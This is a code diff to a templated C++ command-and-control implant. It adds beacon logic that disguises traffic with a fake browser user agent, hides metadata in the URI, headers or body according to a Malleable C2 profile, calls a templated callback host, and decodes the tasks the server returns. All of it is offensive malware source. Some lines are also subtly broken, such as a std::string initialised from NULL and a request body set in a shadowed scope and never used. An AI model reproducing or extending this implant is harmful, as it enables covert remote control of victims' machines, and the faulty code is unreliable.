@@ -43,7 +43,11 @@ nlohmann::json get(std::string implant_uuid) {
     // Hold bytes in a string container, as all the transforms want a string
     // do NOT change the `metadata` var name prior to templating, it's needed for it
     std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
-    std::vector<std::wstring> headers;
+
+    //setup default header, which at minumum contains the useragent
+    std::vector<std::wstring> headers = {
+            L"User-Agent: GoogleChrome", 
+    };
 
     // --- Transforms ---
     //Transform metadata before it goes out to match the malleablec2 profile
@@ -56,6 +60,8 @@ nlohmann::json get(std::string implant_uuid) {
     //note - using scopes for each option
     // Start with the base URI from the profile
     std::wstring uri = L"[[ http_get_uri ]]";
+    std::string request_body = NULL; // NULL by default, as that's what the wininet wants
+    std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
 
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
@@ -82,38 +88,39 @@ nlohmann::json get(std::string implant_uuid) {
         if (!uri.empty() && uri.back() != '/') {
             uri.push_back('/');
         }
+        //could use append from transform here too
         uri += w_metadata;
     }
     [%- endif %]
 
 
-
     [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "print" %]
-
+    [# put in body 
+    TLDR: NULL or none if no data, so pass that if not set here.
+    #]
+    {
+        std::string request_body = w_metadata;
+    }
     [%- endif %]
 
     // --- End Malleable C2 Metadata transport method ---
 
-    if (HTTP_GET(headers, http_response_buffer)) {
-        // Check if buffer is empty before decoding
-        if (http_response_buffer.empty()) {
+    // Call the HTTP_GET
+    // Note: We pass the constructed 'uri' and 'headers' here
+    //if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, L"[[http_user_agent]]", headers, request_body, http_response_buffer)) {
+    if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer)) {
+
+        if (http_response_buffer.empty()){
             return nullptr;
         }
 
-        // --- Reverse Transforms ---
-        //Undo transform on data from server (which holds the task), as declared in malleable c2 profile
+        // Reverse Transforms (Server Output)
         [%- for transform in http_get_server_output_transforms_list %]
         [[ render_reverse_transform(transform, 'http_response_buffer') ]]
         [%- endfor %]
-        // --- End Reverse Transforms ---
 
-        std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
-        nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
-        return task_data;
-    } else {
-        std::cerr << "Request failed." << std::endl;
-        return nullptr;
+        return decode_msgpack_task(http_response_buffer);
     }
 
     return nullptr;
@@ -187,7 +194,14 @@ std::string register_implant() {
         L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
     };
 
-    bool http_response_status = HTTP_GET(headers, http_response_buffer);
+    std::wstring uri = L"[[ http_get_uri ]]";
+    std::string request_body = NULL; // NULL by default, as that's what the wininet wants
+    //std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
+
+    bool http_response_status = (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer));
+
+
+    // = HTTP_GET(headers, http_response_buffer);
 
     if (http_response_status) {
         std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
